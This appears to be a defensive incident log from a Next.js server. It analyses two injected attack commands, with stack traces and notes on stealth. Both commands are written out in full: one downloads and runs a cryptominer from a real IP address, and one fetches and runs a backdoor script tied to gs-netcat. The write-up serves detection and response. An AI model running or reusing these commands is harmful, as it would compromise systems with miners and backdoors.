# Representative Attack Log Entries

## 1. Cryptocurrency Miner Attack Attempt

**Timestamp:** `2025-12-12T12:22:27.886Z`

**Method:** `execSync`

**Command:**
```bash
(cd /dev;(busybox wget -O x86 http://5.231.70.66/nuts/x86||curl -s -o x86 http://5.231.70.66/nuts/x86 );chmod 777 x86;./x86 reactOnMynuts;(busybox wget -q http://5.231.70.66/nuts/bolts -O-||wget -q http://5.231.70.66/nuts/bolts -O-||curl -s http://5.231.70.66/nuts/bolts)|sh)&
```

**Stack Trace:**
```
at d.execSync (/app/.next/server/chunks/4437.js:2:309)
at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:53)
at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
```

**Options:**
```json
{"timeout":120000}
```

**Analysis:**
- Attack attempts to download and execute cryptocurrency miner from `http://5.231.70.66/nuts/x86`
- Uses multiple fallback methods (busybox wget, curl, wget)
- Executes in `/dev` directory with world-writable permissions (chmod 777)
- Downloads secondary payload from `http://5.231.70.66/nuts/bolts` and pipes to shell
- Stack trace shows execution originates from `eval()` context in Next.js runtime
- Call site: `/app/.next/server/chunks/4437.js:2:309` (subprocess diagnostic wrapper)

---

## 2. Backdoor Deployment Attack Attempt

**Timestamp:** `2025-12-12T13:24:27.432Z`

**Method:** `spawnSync`

**Command:**
```bash
sh -c wget -q http://nossl.segfault.net/deploy-all.sh >/dev/null 2>&1;curl -s -S -o /dev/null http://nossl.segfault.net/deploy-all.sh 2>/dev/null && bash ./deploy-all.sh >> qq.txt;cat qq.txt | grep gs-netcat;rm -rf qq.txt
```

**Stack Trace:**
```
at d.spawnSync (/app/.next/server/chunks/4437.js:2:491)
at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:51)
at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
```

**Options:**
```json
{"encoding":"utf8","timeout":5000}
```

**Analysis:**
- Attack attempts to download backdoor deployment script from `http://nossl.segfault.net/deploy-all.sh`
- Uses multiple fallback methods (wget, curl) with output redirection to hide activity
- Executes script and searches output for `gs-netcat` (backdoor tool)
- Cleans up temporary file (`qq.txt`) after execution
- Stack trace shows execution originates from `eval()` context in Next.js runtime
- Call site: `/app/.next/server/chunks/4437.js:2:491` (subprocess diagnostic wrapper)

---

## Key Observations

1. **Both attacks originate from `eval()` context** - Malicious code is being injected at runtime, not hardcoded
2. **Stack traces point to same location** - Both attacks come from `/app/.next/server/chunks/4437.js` (subprocess diagnostic wrapper)
3. **Next.js runtime involvement** - Attacks triggered from `next-server/app-page.runtime.prod.js` eval context
4. **Multiple fallback methods** - Attackers use multiple tools (wget, curl, busybox) to increase success probability
5. **Stealth techniques** - Output redirection, background execution (`&`), temporary file cleanup
6. **No secrets in commands** - Commands contain no API keys, passwords, or tokens (already redacted by diagnostic wrapper)

---

**Log Format:**
```
[SUBPROC_DIAG_GLOBAL] {"ts":"<timestamp>","method":"<method>","cmd":"<command>","stack":"<stack_trace>","options":"<options_json>"}
```

